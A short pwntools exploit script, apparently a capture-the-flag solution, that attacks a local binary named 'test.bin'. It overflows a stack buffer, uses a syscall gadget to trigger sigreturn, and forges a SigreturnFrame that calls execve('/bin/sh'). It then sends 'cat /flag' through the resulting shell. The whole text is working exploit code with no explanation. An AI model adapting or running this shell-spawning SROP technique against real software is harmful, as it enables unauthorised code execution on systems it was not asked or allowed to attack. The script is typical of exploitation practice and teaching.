from pwn import *
import time 

p = process("./test.bin")
e = p.elf 
rop = ROP(e) 

context.arch = 'amd64'
padding = b'A' * (0x30 + 8)

sigrop = next(e.search(asm('mov eax,0xf; syscall'))) # sigrop call
syscall = rop.find_gadget(["syscall"]).address # syscall location
binsh = next(e.search(b"/bin/sh\x00")) # /bin/sh location

s = SigreturnFrame(kernel='amd64')

s.rax = constants.SYS_execve
s.rdi = binsh
s.rsi = 0
s.rdx = 0
s.rip = syscall


payload = padding + p64(sigrop) + bytes(s)  

p.send(payload)

#p.interactive()
time.sleep(1) 
p.sendline("cat /flag") 
print(p.recvline(timeout=1))
